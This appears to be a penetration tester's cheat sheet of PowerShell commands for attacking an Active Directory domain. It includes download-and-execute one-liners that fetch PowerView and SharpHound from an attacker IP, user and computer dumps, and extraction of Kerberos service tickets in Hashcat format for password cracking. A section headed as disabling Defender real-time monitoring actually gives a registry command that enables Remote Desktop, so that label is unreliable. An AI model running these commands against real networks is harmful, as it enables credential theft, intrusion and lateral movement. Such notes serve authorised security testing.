---
description: This is just a living document of things I have needed for domain enumeration
---

# Domain Enumeration

## POWERSPLOIT

Use the `dev` branch or [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev). For an already incredible cheatsheet, check out HarmJ0y's - [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

`IEX(New-Object Net.WebClient).downloadString('http://10.10.10.123/ps/PowerView.ps1')`

### Domain Users

`Get-NetUser * -Domain corp.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,mail,useraccountcontrol | Export-CSV users.csv`

### Domain Computers

`Get-NetComputer * -Domain corp.local | Select-Object -Property dnshostname,operatingsystem,operatingsystemservicepack,lastlogontimestamp | Export-CSV computers.csv`

### SPN Ticket Request

`Get-DomainUser * -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv .\ticket.csv -NoTypeInformation`

## BLOODHOUND

### Ingestor Launch

```text
IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.123/ps/SharpHound.ps1');
Invoke-BloodHound -CollectionMethod ACL,ObjectProps,Default -CompressData -SkipPing;
```

## EVADING AV

### Turning Off Defender's RTM

`PS C:\Windows\system32> Set-itemproperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\' -Name "fDenyTSConnections" -value 0`

